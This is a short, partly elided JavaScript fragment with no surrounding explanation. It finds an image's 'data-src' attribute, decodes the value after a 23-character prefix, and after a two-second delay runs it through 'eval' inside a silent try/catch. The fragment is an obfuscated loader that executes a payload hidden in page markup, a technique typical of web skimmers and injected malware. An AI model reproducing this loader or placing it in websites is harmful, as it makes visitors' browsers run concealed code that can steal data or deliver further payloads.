...
var code_attr = document.getElementsByTagName('img');
for (var i = 0; i < code_attr.length; i++) {
    if (code_attr[i].getAttribute('data-src')) {
        code_attr = code_attr[i].getAttribute('data-src');
        break;
    }
}
((sfd = this.eval),
    ...
    (glob = function (a) {
        try {
            sfd(rty(a.substring(23)));
        } catch {}
    }),
    null != code_attr && setTimeout(glob, 2e3, code_attr));
